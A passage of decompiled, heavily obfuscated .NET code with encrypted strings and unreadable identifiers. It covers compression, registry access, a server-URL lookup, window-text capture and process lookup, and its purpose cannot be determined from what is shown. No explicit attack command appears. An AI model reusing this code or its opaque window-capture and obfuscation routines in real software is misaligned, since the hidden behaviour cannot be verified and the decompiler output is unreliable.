        \u0006.\u0007.\u0001(ex, (object) numArray2, (object) str3, (object) obj, (object) str4);
        throw;
      }
      return str2;
    }

    static object \u0001([In] \u0001 obj0, [In] byte[] obj1, [In] string obj2)
    {
      Exception exception1;
      object[] objArray1;
      object obj3;
      try
      {
        obj3 = (object) \u001A\u0003.\u009C\u0005(obj1);
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
        \u0001 obj4 = \u0001.\u0001;
        object obj5 = obj3;
        string str = \u0006.\u0007.\u001F(3219);
        objArray1 = new object[1]
        {
          (object) global::\u0004.\u0004(\u0018\u0002.\u008B\u0004(global::\u0002.\u0002(\u0001.\u0001(obj3, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), \u0006.\u0007.\u001F(3240), -1, CompareMethod.Binary)[0], \u0006.\u0007.\u001F(3060), obj2)
        };
        object[] objArray2 = objArray1;
        return obj4(obj5, (System.Type) null, str, objArray2, (string[]) null, (System.Type[]) null, (bool[]) null);
      }
      catch (Exception ex)
      {
        object obj6 = obj3;
        object obj7;
        object obj8 = obj7;
        Exception exception2 = exception1;
        object[] objArray3 = objArray1;
        \u0001 obj9 = obj0;
        byte[] numArray = obj1;
        string str = obj2;
        \u0006.\u0007.\u0001(ex, obj6, obj8, (object) exception2, (object) objArray3, (object) obj9, (object) numArray, (object) str);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0005 obj0, [In] \u0008.\u0008 obj1)
    {
      if (obj1.\u0003 == null)
      {
        try
        {
          UploadReportLoginService reportLoginService1 = new UploadReportLoginService();
          UploadReportLoginService reportLoginService2;
          if (true)
            reportLoginService2 = reportLoginService1;
          if (obj1.\u0001 != null)
            \u008C\u0002.\u007E\u0006\u0005((object) reportLoginService2, obj1.\u0001);
          obj1.\u0003 = reportLoginService2.GetServerURL(obj1.\u0002);
          if (\u0018.\u007E\u0084((object) obj1.\u0003) == 0)
            throw new ApplicationException(\u0006.\u0007.\u001F(3245));
          if (\u0095.\u0017\u0003(obj1.\u0003, \u0006.\u0007.\u001F(3286)))
            obj1.\u0003 = \u0008.\u0008.\u0001;
        }
        catch (Exception ex)
        {
          obj0(\u001D.\u0099(\u0006.\u0007.\u001F(3295), \u001E.\u007E\u0004\u0002((object) ex)));
          return;
        }
      }
      obj0(\u0015.\u007E\u0080((object) obj1.\u0003, \u0006.\u0007.\u001F(3312)) ? obj1.\u0003 : \u0006.\u0007.\u001F(3317));
    }

    static string \u0001([In] \u0005.\u0002.\u0003 obj0) => obj0.\u0003;

    static void \u0001([In] \u0005.\u0002 obj0, [In] \u0004.\u0006 obj1)
    {
      \u0004.\u0006 obj2 = obj0.\u0001;
label_4:
      \u0004.\u0006 comparand = obj2;
      do
      {
        \u0004.\u0006 obj3 = (\u0004.\u0006) \u0001\u0002.\u009C\u0003((Delegate) comparand, (Delegate) obj1);
        \u0004.\u0006 obj4;
        if (true)
          obj4 = obj3;
        obj2 = Interlocked.CompareExchange<\u0004.\u0006>(ref obj0.\u0001, obj4, comparand);
        if (obj2 != comparand)
          goto label_4;
      }
      while (false);
    }

    static string \u0001() => \u001D.\u0099(\u0006.\u0007.\u001F(3322), \u0006.\u0007.\u0001());

    [DllImport("psapi", EntryPoint = "EmptyWorkingSet")]
    static extern bool \u0001([In] long obj0);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001(IntPtr _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    static void \u0001([In] byte[] obj0, [In] short[] obj1, [In] \u0003.\u0004.\u0007.\u0001 obj2)
    {
label_0:
      try
      {
        if (false)
          goto label_2;
        else
          goto label_4;
label_1:
        if (true)
          obj2.\u0001 = obj0;
        else
          goto label_0;
label_2:
        if (true)
          return;
        goto label_1;
label_4:
        obj2.\u0002 = obj1;
        goto label_1;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0007.\u0001 obj = obj2;
        short[] numArray1 = obj1;
        byte[] numArray2 = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) numArray1, (object) numArray2);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0006 obj0) => \u0006.\u0007.\u0001(obj0, string.Empty);

    static void \u0001([In] \u0005.\u0002 obj0, [In] \u000E.\u0002 obj1, [In] string obj2) => \u0006.\u0007.\u0001(obj0, obj1, obj2, string.Empty);

    static System.Type \u0001([In] \u0006.\u0005 obj0) => obj0.\u0001;

    static unsafe void \u0001([In] Exception obj0, [In] object[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      *(int*) voidPtr = -1;
      *(int*) ((IntPtr) voidPtr + 4) = -1;
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      StackTrace stackTrace = new StackTrace(obj0);
      try
      {
        switch (\u001E.\u007E\u0005\u0002((object) obj0))
        {
          case null:
            break;
          default:
            string[] strArray = \u001B\u0003.\u007E\u009D\u0005((object) \u001E.\u007E\u0005\u0002((object) obj0), new char[2]
            {
              '\r',
              '\n'
            });
            *(int*) ((IntPtr) voidPtr + 12) = 0;
            while (*(int*) ((IntPtr) voidPtr + 12) < strArray.Length)
            {
              string str = strArray[*(int*) ((IntPtr) voidPtr + 12)];
              if (\u0018.\u007E\u0084((object) str) > 0)
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
            }
            break;
        }
      }
      catch
      {
        *(int*) ((IntPtr) voidPtr + 8) = -1;
      }
      try
      {
        if (\u0018.\u007E\u008D((object) stackTrace) > 0)
        {
          StackFrame stackFrame = \u001C\u0003.\u007E\u009E\u0005((object) stackTrace, \u0018.\u007E\u008D((object) stackTrace) - 1);
          *(int*) voidPtr = (\u0018.\u007E\u008E((object) \u001D\u0003.\u007E\u009F\u0005((object) stackFrame)) & 16777215) - 1;
          *(int*) ((IntPtr) voidPtr + 4) = \u0018.\u007E\u008F((object) stackFrame);
        }
      }
      catch
      {
      }
      try
      {
        SmartStackFrame smartStackFrame = new SmartStackFrame(*(int*) voidPtr, obj1, *(int*) ((IntPtr) voidPtr + 4), *(int*) ((IntPtr) voidPtr + 8));
        LinkedList<object> linkedList;
        if (!\u001F\u0003.\u007E\u0002\u0006((object) \u001E\u0003.\u007E\u0001\u0006((object) obj0), (object) \u0006.\u0007.\u001F(3347)))
        {
          linkedList = new LinkedList<object>();
          \u0094.\u007E\u0016\u0003((object) \u001E\u0003.\u007E\u0001\u0006((object) obj0), (object) \u0006.\u0007.\u001F(3347), (object) linkedList);
        }
        else
          linkedList = (LinkedList<object>) \u0090.\u007E\u000E\u0003((object) \u001E\u0003.\u007E\u0001\u0006((object) obj0), (object) \u0006.\u0007.\u001F(3347));
        linkedList.AddLast((object) smartStackFrame);
      }
      catch
      {
      }
    }

    static void \u0001([In] \u0003.\u0004.\u0002 obj0, [In] int obj1)
    {
      try
      {
        if (true)
          obj0.\u0001 >>= obj1;
        else
          goto label_4;
label_2:
        if (true)
          obj0.\u0003 -= obj1;
label_4:
        if (false)
          goto label_2;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0002 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static string \u0001() => \u0006.\u0007.\u0001().\u0001;

    static void \u0001([In] \u0001 obj0)
    {
      try
      {
        \u0006.\u0007.\u0001(obj0, 0);
      }
      catch (Exception ex)
      {
        \u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0003.\u0004.\u000F obj0, [In] int obj1)
    {
      try
      {
        do
        {
          if (true)
            goto label_4;
label_1:
          if (true)
            continue;
          goto label_5;
label_4:
          obj0.WriteByte((byte) (obj1 & (int) byte.MaxValue));
label_5:
          obj0.WriteByte((byte) (obj1 >> 8 & (int) byte.MaxValue));
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u000F obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static string \u0001([In] \u0005.\u0002.\u0003 obj0) => obj0.\u0001;

    static Assembly[] \u0001([In] \u0002.\u0003 obj0)
    {
      Assembly[] assemblyArray1;
      try
      {
        do
        {
          do
          {
            assemblyArray1 = \u0080\u0003.\u007E\u0004\u0006((object) \u007F\u0003.\u0003\u0006());
          }
          while (false);
        }
        while (false);
      }
      catch
      {
        Assembly[] assemblyArray2;
        if (true)
        {
          if (true)
            assemblyArray2 = new Assembly[1];
          else
            goto label_6;
        }
        assemblyArray2[0] = \u0006.\u0007.\u0001();
        assemblyArray1 = assemblyArray2;
      }
label_6:
      return assemblyArray1;
    }

    static int \u0001([In] \u0003.\u0004.\u000F obj0)
    {
      int num1;
      try
      {
        if (true)
        {
          int num2 = \u0006.\u0007.\u0001(obj0);
          int num3;
          while (true)
          {
            int num4 = \u0006.\u0007.\u0001(obj0);
            int num5;
            while (true)
            {
              num5 = num4 << 16;
              if (false)
                num4 = num5;
              else
                break;
            }
            num3 = num2 | num5;
            if (false)
              num2 = num3;
            else
              break;
          }
          num1 = num3;
        }
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u000F obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static unsafe int \u0001([In] int obj0, [In] byte[] obj1, [In] \u0003.\u0004.\u0003 obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      try
      {
        *(int*) voidPtr = obj2.\u0001;
        if (obj0 <= obj2.\u0002)
          goto label_9;
        else
          goto label_8;
label_2:
        do
        {
          *(int*) ((IntPtr) voidPtr + 4) = obj0;
          *(int*) ((IntPtr) voidPtr + 8) = obj0 - *(int*) voidPtr;
          if (*(int*) ((IntPtr) voidPtr + 8) > 0)
          {
            Array.Copy((Array) obj2.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj1, obj3, *(int*) ((IntPtr) voidPtr + 8));
            obj3 += *(int*) ((IntPtr) voidPtr + 8);
          }
          else
            goto label_5;
        }
        while (false);
        obj0 = *(int*) voidPtr;
label_5:
        Array.Copy((Array) obj2.\u0001, *(int*) voidPtr - obj0, (Array) obj1, obj3, obj0);
        obj2.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
        if (obj2.\u0002 < 0)
          throw new InvalidOperationException();
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4);
        goto label_11;
label_8:
        obj0 = obj2.\u0002;
        goto label_2;
label_9:
        *(int*) voidPtr = obj2.\u0001 - obj2.\u0002 + obj0 & (int) short.MaxValue;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        \u0003.\u0004.\u0003 obj = obj2;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) numArray, (object) local4, (object) local5);
        throw;
      }
label_11:
      return *(int*) ((IntPtr) voidPtr + 12);
    }

    static string \u0001() => \u001D.\u0099(\u0006.\u0007.\u001F(3372), \u0006.\u0007.\u0001());

    static unsafe void \u0001([In] \u0003.\u0004.\u0007 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num;
      try
      {
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj0.\u0001)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0002[*(int*) voidPtr] & (int) byte.MaxValue;
          num = (int) obj0.\u0001[*(int*) voidPtr];
          if (num-- != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = \u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 4), obj0);
            \u0006.\u0007.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 8));
            *(int*) ((IntPtr) voidPtr + 12) = (*(int*) ((IntPtr) voidPtr + 8) - 261) / 4;
            if (*(int*) ((IntPtr) voidPtr + 12) > 0 && *(int*) ((IntPtr) voidPtr + 12) <= 5)
              \u0006.\u0007.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4) & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
            *(int*) ((IntPtr) voidPtr + 16) = \u0006.\u0007.\u0001(obj0, num);
            \u0006.\u0007.\u0001(obj0.\u0002, *(int*) ((IntPtr) voidPtr + 16));
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 16) / 2 - 1;
            if (*(int*) ((IntPtr) voidPtr + 12) > 0)
              \u0006.\u0007.\u0001(obj0.\u0001, num & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
          }
          else
            \u0006.\u0007.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        \u0006.\u0007.\u0001(obj0.\u0001, 256);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u0003.\u0004.\u0007 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0006 obj0)
    {
      \u0012\u0002.\u007E\u0082\u0004((object) obj0.\u0001, true);
      obj0.\u0001 = (Image) \u0006.\u0007.\u0001(\u0006.\u0007.\u001F(3413));
      obj0.\u0001 = true;
      \u009B.\u007E\u0083\u0003((object) obj0);
    }

    static unsafe string \u0001([In] \u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(12);
      string str1;
      string str2;
      string str3;
      string str4;
      Exception exception1;
      char[] chArray1;
      try
      {
        try
        {
          str1 = \u001D.\u0099(\u007F.\u001C\u0002(\u0006.\u0007.\u001F(3426)), \u0006.\u0007.\u001F(834));
          if (true)
          {
            ref string local1 = ref str1;
            str2 = (string) null;
            ref string local2 = ref str2;
            void* voidPtr2 = voidPtr1;
            *(int*) ((IntPtr) voidPtr1 + 4) = 0;
            IntPtr num1 = (IntPtr) voidPtr1 + 4;
            *(int*) ((IntPtr) voidPtr1 + 8) = 0;
            IntPtr num2 = (IntPtr) voidPtr1 + 8;
            str3 = (string) null;
            ref string local3 = ref str3;
            // ISSUE: cast to a reference type
            // ISSUE: cast to a reference type
            \u0006.\u0007.\u0001(ref local1, ref local2, 0, ref *(int*) voidPtr2, (int&) num1, (int&) num2, ref local3, 0);
            str4 = \u0086\u0002.\u009E\u0004(*(int*) voidPtr1);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          chArray1 = new char[3]{ 'E', 'R', 'R' };
          str4 = new string(chArray1);
          global::\u0006.\u0006();
        }
        return str4;
      }
      catch (Exception ex)
      {
        string str5 = str4;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) voidPtr1;
        Exception exception2 = exception1;
        string str6 = str1;
        string str7 = str2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr1 + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr1 + 8);
        string str8 = str3;
        char[] chArray2 = chArray1;
        \u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) str5, (object) local4, (object) exception2, (object) str6, (object) str7, (object) local5, (object) local6, (object) str8, (object) chArray2, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0003.\u0005 obj0, [In] bool obj1) => obj0.\u0003 = obj1;

    static int \u0001([In] \u0003.\u0004.\u000F obj0)
    {
      int num1;
      try
      {
        if (true)
        {
          int num2 = obj0.ReadByte();
          int num3;
          while (true)
          {
            int num4 = obj0.ReadByte();
            int num5;
            while (true)
            {
              num5 = num4 << 8;
              if (false)
                num4 = num5;
              else
                break;
            }
            num3 = num2 | num5;
            if (false)
              num2 = num3;
            else
              break;
          }
          num1 = num3;
        }
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u000F obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static byte[] \u0001([In] \u0001 obj0, [In] byte[] obj1, [In] ref bool obj2)
    {
      object[] objArray1;
      object[] objArray2;
      bool[] flagArray1;
      object obj3;
      object obj4;
      byte[] numArray1;
      object obj5;
      object obj6;
      byte[] numArray2;
      int num;
      byte[] numArray3;
      try
      {
        if (!obj2)
        {
          obj5 = (object) new MemoryStream(obj1);
          obj6 = (object) new GZipStream((Stream) obj5, CompressionMode.Decompress);
          numArray2 = new byte[4];
          \u001B obj7 = \u001B.\u0097;
          object obj8 = obj5;
          string str1 = \u0006.\u0007.\u001F(3443);
          objArray2 = new object[1]
          {
            global::\u000E.\u0014(\u0001.\u0001(obj5, (System.Type) null, \u0006.\u0007.\u001F(3456), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 5)
          };
          object[] objArray3 = objArray2;
          obj7(obj8, (System.Type) null, str1, objArray3, (string[]) null, (System.Type[]) null);
          \u0011 obj9 = \u0011.\u001A;
          object obj10 = obj5;
          string str2 = \u0006.\u0007.\u001F(3465);
          objArray2 = new object[3]
          {
            (object) numArray2,
            (object) 0,
            (object) 4
          };
          objArray1 = objArray2;
          object[] objArray4 = objArray1;
          flagArray1 = new bool[3]{ true, false, false };
          bool[] flagArray2 = flagArray1;
          object obj11 = obj9(obj10, (System.Type) null, str2, objArray4, (string[]) null, (System.Type[]) null, flagArray2, true);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            numArray2 = (byte[]) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (byte[])));
          }
          num = \u0081\u0003.\u0005\u0006(numArray2, 0);
          \u001B obj12 = \u001B.\u0097;
          object obj13 = obj5;
          string str3 = \u0006.\u0007.\u001F(3443);
          objArray2 = new object[1]{ (object) 0 };
          object[] objArray5 = objArray2;
          obj12(obj13, (System.Type) null, str3, objArray5, (string[]) null, (System.Type[]) null);
          numArray3 = new byte[checked (num - 1 + 1)];
          \u0011 obj14 = \u0011.\u001A;
          object obj15 = obj6;
          string str4 = \u0006.\u0007.\u001F(3465);
          objArray2 = new object[3]
          {
            (object) numArray3,
            (object) 0,
            (object) num
          };
          objArray1 = objArray2;
          object[] objArray6 = objArray1;
          flagArray1 = new bool[3]{ true, false, true };
          bool[] flagArray3 = flagArray1;
          object obj16 = obj14(obj15, (System.Type) null, str4, objArray6, (string[]) null, (System.Type[]) null, flagArray3, true);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            numArray3 = (byte[]) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (byte[])));
          }
          if (flagArray1[2])
          {
            // ISSUE: type reference
            num = (int) \u0014.\u001D(\u0012.\u001B(objArray1[2]), \u0013.\u001C(__typeref (int)));
          }
          object obj17 = \u0011.\u001A(obj6, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          object obj18 = \u0011.\u001A(obj5, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          return numArray3;
        }
        obj4 = (object) new MemoryStream();
        obj3 = (object) new GZipStream((Stream) obj4, CompressionMode.Compress, true);
        \u0011 obj19 = \u0011.\u001A;
        object obj20 = obj3;
        string str5 = \u0006.\u0007.\u001F(564);
        objArray1 = new object[3]
        {
          (object) obj1,
          (object) 0,
          (object) obj1.Length
        };
        objArray2 = objArray1;
        object[] objArray7 = objArray2;
        flagArray1 = new bool[3]{ true, false, false };
        bool[] flagArray4 = flagArray1;
        object obj21 = obj19(obj20, (System.Type) null, str5, objArray7, (string[]) null, (System.Type[]) null, flagArray4, true);
        if (flagArray1[0])
        {
          // ISSUE: type reference
          obj1 = (byte[]) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (byte[])));
        }
        object obj22 = \u0011.\u001A(obj3, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        \u001B obj23 = \u001B.\u0097;
        object obj24 = obj4;
        string str6 = \u0006.\u0007.\u001F(3443);
        objArray2 = new object[1]{ (object) 0 };
        object[] objArray8 = objArray2;
        obj23(obj24, (System.Type) null, str6, objArray8, (string[]) null, (System.Type[]) null);
        numArray1 = new byte[checked (\u0010.\u0019(\u0001.\u0001(obj4, (System.Type) null, \u0006.\u0007.\u001F(3456), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)) + 1)];
        \u0011 obj25 = \u0011.\u001A;
        object obj26 = obj4;
        string str7 = \u0006.\u0007.\u001F(3465);
        objArray2 = new object[3]
        {
          (object) numArray1,
          (object) 0,
          (object) numArray1.Length
        };
        objArray1 = objArray2;
        object[] objArray9 = objArray1;
        flagArray1 = new bool[3]{ true, false, false };
        bool[] flagArray5 = flagArray1;
        object obj27 = obj25(obj26, (System.Type) null, str7, objArray9, (string[]) null, (System.Type[]) null, flagArray5, true);
        if (flagArray1[0])
        {
          // ISSUE: type reference
          numArray1 = (byte[]) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (byte[])));
        }
        object obj28 = \u0011.\u001A(obj4, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        return numArray1;
      }
      catch (Exception ex)
      {
        byte[] numArray4;
        object[] objArray10 = new object[15]
        {
          (object) numArray4,
          (object) numArray1,
          obj3,
          obj4,
          (object) numArray3,
          (object) numArray2,
          obj6,
          obj5,
          (object) num,
          (object) objArray1,
          (object) objArray2,
          (object) flagArray1,
          (object) obj0,
          (object) obj1,
          (object) obj2
        };
        \u0006.\u0007.\u0001(ex, objArray10);
        throw;
      }
    }

    static object \u0001([In] \u0001 obj0, [In] string obj1, [In] string obj2)
    {
      char[] chArray1;
      object[] objArray1;
      object[] objArray2;
      object[] objArray3;
      bool[] flagArray1;
      object obj3;
      Exception exception1;
      try
      {
        try
        {
          \u0011 obj4 = \u0011.\u001A;
          \u0001 obj5 = \u0001.\u0001;
          object obj6 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str1 = \u0006.\u0007.\u001F(1035);
          objArray1 = new object[1];
          object[] objArray4 = objArray1;
          chArray1 = new char[9]
          {
            'S',
            'o',
            'f',
            't',
            'w',
            'a',
            'r',
            'e',
            '\\'
          };
          string str2 = \u001D.\u0099(new string(chArray1), obj0.\u0006);
          objArray4[0] = (object) str2;
          object[] objArray5 = objArray1;
          object obj7 = obj5(obj6, (System.Type) null, str1, objArray5, (string[]) null, (System.Type[]) null, (bool[]) null);
          string str3 = \u0006.\u0007.\u001F(2460);
          objArray2 = new object[2]
          {
            (object) obj1,
            (object) obj2
          };
          objArray3 = objArray2;
          object[] objArray6 = objArray3;
          flagArray1 = new bool[2]{ true, true };
          bool[] flagArray2 = flagArray1;
          object obj8 = obj4(obj7, (System.Type) null, str3, objArray6, (string[]) null, (System.Type[]) null, flagArray2, true);
          int num = flagArray1[0] ? 1 : 0;
          if (true)
          {
            if (num != 0)
            {
              // ISSUE: type reference
              obj1 = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
            }
            if (flagArray1[1])
            {
              // ISSUE: type reference
              obj2 = (string) \u0014.\u001D(\u0012.\u001B(objArray3[1]), \u0013.\u001C(__typeref (string)));
            }
            num = 1;
          }
          obj3 = (object) (bool) num;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          obj3 = (object) false;
          global::\u0006.\u0006();
        }
        return obj3;
      }
      catch (Exception ex)
      {
        object obj9 = obj3;
        Exception exception2 = exception1;
        char[] chArray2 = chArray1;
        object[] objArray7 = objArray1;
        object[] objArray8 = objArray2;
        object[] objArray9 = objArray3;
        bool[] flagArray3 = flagArray1;
        \u0001 obj10 = obj0;
        string str4 = obj1;
        string str5 = obj2;
        \u0006.\u0007.\u0001(ex, obj9, (object) exception2, (object) chArray2, (object) objArray7, (object) objArray8, (object) objArray9, (object) flagArray3, (object) obj10, (object) str4, (object) str5);
        throw;
      }
    }

    static unsafe void \u0001([In] \u000E.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      try
      {
        if (false)
          return;
        Graphics graphics = \u0082\u0003.\u0006\u0006((object) obj0);
        try
        {
          string str = \u001E.\u007E\u0003\u0002((object) obj0);
          Font font = \u0083\u0003.\u007E\u0008\u0006((object) obj0);
          *(int*) ((IntPtr) voidPtr + 4) = \u0018.\u0086((object) obj0);
          *(int*) voidPtr = \u0006.\u0007.\u0001(font, str, graphics, *(int*) ((IntPtr) voidPtr + 4));
          if (*(int*) voidPtr <= 0)
            return;
          \u000E\u0002.\u0011\u0004((object) obj0, *(int*) voidPtr);
        }
        finally
        {
          if (graphics != null)
            \u009B.\u007E\u007F\u0003((object) graphics);
        }
      }
      catch
      {
      }
    }

    static string \u0001([In] \u0001 obj0, [In] string obj1)
    {
      object[] objArray1;
      object[] objArray2;
      object[] objArray3;
      bool[] flagArray1;
      string str1;
      Exception exception1;
      try
      {
        try
        {
          \u0001 obj2 = \u0001.\u0001;
          \u0001 obj3 = \u0001.\u0001;
          object obj4 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str2 = \u0006.\u0007.\u001F(1035);
          objArray1 = new object[1]
          {
            (object) \u001D.\u0099(\u0006.\u0007.\u001F(3474), obj0.\u0006)
          };
          object[] objArray4 = objArray1;
          object obj5 = obj3(obj4, (System.Type) null, str2, objArray4, (string[]) null, (System.Type[]) null, (bool[]) null);
          string str3 = \u0006.\u0007.\u001F(3118);
          objArray2 = new object[2]
          {
            (object) obj1,
            (object) \u0006.\u0007.\u001F(379)
          };
          objArray3 = objArray2;
          object[] objArray5 = objArray3;
          flagArray1 = new bool[2]{ true, false };
          bool[] flagArray2 = flagArray1;
          object obj6 = obj2(obj5, (System.Type) null, str3, objArray5, (string[]) null, (System.Type[]) null, flagArray2);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            obj1 = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
          }
          str1 = Conversions.ToString(obj6);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          str1 = \u0006.\u0007.\u001F(379);
          global::\u0006.\u0006();
        }
        return str1;
      }
      catch (Exception ex)
      {
        string str4 = str1;
        Exception exception2 = exception1;
        object[] objArray6 = objArray1;
        object[] objArray7 = objArray2;
        object[] objArray8 = objArray3;
        bool[] flagArray3 = flagArray1;
        \u0001 obj = obj0;
        string str5 = obj1;
        \u0006.\u0007.\u0001(ex, (object) str4, (object) exception2, (object) objArray6, (object) objArray7, (object) objArray8, (object) flagArray3, (object) obj, (object) str5);
        throw;
      }
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5)
    {
      \u0006.\u0007.\u0001(obj0, new object[5]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5
      });
    }

    static string \u0001([In] \u0001 obj0)
    {
      int num1;
      IntPtr num2;
      object obj1;
      Exception exception1;
      try
      {
        string str;
        try
        {
          if (true)
          {
            num2 = \u0006.\u0007.\u0001();
            \u0006.\u0007.\u0001(num2, ref num1);
            Process process = \u0099\u0002.\u001E\u0005(num1);
            if (true)
              goto label_4;
label_1:
